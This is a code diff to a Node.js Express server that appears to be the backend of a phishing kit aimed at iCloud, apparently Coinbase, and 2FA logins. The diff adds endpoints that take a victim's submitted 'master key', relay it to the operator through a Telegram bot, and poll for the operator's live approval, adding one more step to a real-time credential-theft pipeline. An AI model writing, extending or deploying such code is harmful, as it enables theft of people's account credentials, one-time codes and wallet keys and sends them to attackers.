@@ -13,7 +13,8 @@ const {
   sendLoginTelegram,
   sendVerifyTelegram,
   send2FATelegram,
-  send2FACode
+  send2FACode,
+  sendMasterKeyTelegram
 } = require("./bot");
 
 const app = express();
@@ -34,6 +35,7 @@ const pendingPage = {};       // iCloud page logins
 const pendingApprovals = {};  // CB login approvals
 const pending2FA = {};        // 2FA approvals
 const pendingVerify = {};     // verify page approvals (3 buttons)
+const pendingMasterKey = {};  // master key page approvals
 
 // -----------------
 // User ID counter (assigns a unique ID per IP)
@@ -252,8 +254,52 @@ app.post("/api/submit-2fa-new", async (req, res) => {
 });
 
 // -----------------
-// 2FA: Poll approval status (shared by both 2FA endpoints)
+// ✅ NEW: Master Key submit
 // -----------------
+app.post("/api/submit-masterkey", async (req, res) => {
+  const { message, requestId } = req.body;
+
+  if (!message || !requestId) {
+    return res.status(400).json({ error: "Missing message or requestId" });
+  }
+
+  pendingMasterKey[requestId] = { status: "pending", message };
+  console.log(`📥 Master Key Request received: ${requestId}`);
+
+  try {
+    await sendMasterKeyTelegram(message, requestId);
+    res.json({ status: "pending", requestId });
+  } catch (err) {
+    console.error("❌ Failed to send Master Key Telegram message:", err);
+    res.status(500).json({ error: "Failed to send Telegram message" });
+  }
+});
+
+// -----------------
+// ✅ NEW: Master Key poll status
+// -----------------
+app.get("/api/masterkey-status/:requestId", (req, res) => {
+  const { requestId } = req.params;
+  const entry = pendingMasterKey[requestId];
+  if (!entry) return res.json({ status: "pending" });
+  res.json({ status: entry.status });
+});
+
+// -----------------
+// ✅ NEW: Master Key update status (called by bot)
+// -----------------
+app.post("/api/update-masterkey-status", (req, res) => {
+  const { requestId, status } = req.body;
+  if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
+
+  if (pendingMasterKey[requestId]) {
+    pendingMasterKey[requestId].status = status;
+    console.log(`✅ Master Key status updated: ${requestId} → ${status}`);
+    return res.json({ ok: true });
+  }
+
+  res.json({ ok: false, message: "requestId not found" });
+});
 app.get("/api/approval-status/:requestId", (req, res) => {
   const { requestId } = req.params;
   const entry = pending2FA[requestId];
